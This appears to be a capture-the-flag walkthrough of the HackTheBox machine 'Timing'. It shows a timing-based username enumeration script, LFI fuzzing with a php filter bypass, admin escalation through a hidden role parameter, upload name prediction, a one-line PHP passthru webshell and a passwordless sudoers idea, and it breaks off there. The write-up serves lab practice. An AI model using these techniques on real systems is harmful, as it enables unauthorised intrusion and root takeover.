Timing is a medium box on HackTheBox and it features source code review to find the location of our payloads, abusing local file inclusion, bad github practices, and the exploitation of a binary that can write files with root level privileges. It's always fun to come across a box that deals with github repositories. Enumerating them and finding sensitive files is pretty common. Aside from the source code review section, this box was very enjoyable.

Website is just a basic login page. Brute directores and look for php extentions since we know this is a php webserver.

By the looks of it, many redirect back to the logon because it probably requires authenitcations to hit those pages with the exception of images.

From here we have 2 routes: Brute force users or exploit images.

When playing around with the login form, its worth noting that there is a delay between real users and fake users. Ex: admin has a response time of over 1 second and sadf returns istantly. A python script can be made to test this.

Here's my script:
```python
import requests

url = 'http://timing.htb/login.php?login=true'
with open('/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt') as wordlist:
        for line in wordlist:
                response = requests.post(url, data={"user":line.rstrip(),"password":"lmao"}, timeout=2000)
                if response.elapsed.total_seconds() > 1:
                        print(response.elapsed.total_seconds(), line.rstrip())
```

Output:
```console                                         
1.271603 admin      
1.267196 aaron
```

Luckily aaron has a reused password, their own username.

Nothing much of interest. 

Here is the way to exploit the images. We have an image.php which might take parameters. Lets fuzz for them.

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://timing.htb/image.php?FUZZ=/etc/passwd -fw 1`
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/

img                     [Status: 200, Size: 25, Words: 3, Lines: 1, Duration: 75ms]
```

Using /etc/passwd as our test payload, we return img as a parameter.

Looks like there is a firewall. We can bypass with php filter base64 encode.

![](https://i.imgur.com/V7J3f52.png)

And with that we have LFI. We can now look at the source code of many of the php files. Here's the interesting bits.

admin_auth_check.php
```php
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}

?>
```

upload.php
```php
$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}
```
Post request from profile update
![](https://i.imgur.com/pEfGOmK.png)

So we see that profile update seems to possibly take a role as an update but was not visible at the website. Role seems to denote 0 for false 1 for true for admin. Lets set it to 1.

![](https://i.imgur.com/8QOgnNz.png)


![](https://i.imgur.com/9xEtwBF.png)

Now we have file upload. From the source code of upload, we see that it only takes .jpg extentions. We just need to hit the file we upload, say a webshell. To do that we need the file name and chain LFI into code exececution.

```php
$file_hash = uniqid();

$file_name = md5('$file_hash' . time())
```

The end of the file is always _ [filename].jpg so thats easy
uniqid() and time() are both time functions used to create a unique name. uniqid() goes down to the microsecond while time() only goes to seconds.

Luckily, we don't need to script out thousands of hashes because the singl quotes wrapping file_hash. Its not taking the uniqid() rather, its taking it litterally as a string. We can grab the time() value of our file and generate the hash aka the name of our file and hit it. We just need a php webshell to upload.

```php
<?php echo passthru($_GET['cmd']); ?>
```

This is the content of lmao, our webshell.

![](https://i.imgur.com/8bl1PPK.png)

Our file is uploaded. Now we grab that time stamp and convert it and generate our hash.

![](https://i.imgur.com/cWPW9sm.png)
This was the time from our request found in burp.

```php        
php > echo md5('$file_hash' . "1654763555");
ba6d60c9ae5c86a3333b43daedbdaf92
```

Now that should be our hash.

![](https://i.imgur.com/fx85AzD.png)

We have code execution but no shell just yet.

![](https://i.imgur.com/D2ysswV.png)

There must be a firewall blocking outbound. Manual enumeration time.

![](https://i.imgur.com/6RIzJXt.png)

A backup file in the opt. We can hit the webroot so lets move this file there so we can hit it and download it.

![](https://i.imgur.com/QJnOZ64.png)

No response, lets see if it is there.

![](https://i.imgur.com/jmcri2C.png)

We got it, now download and inspect.

This command is practically file write since we can download files. What if we were to add an additional config to /etc/sudoers.d ? Additional configs such as setting sudo to no passwords for all would be useful.
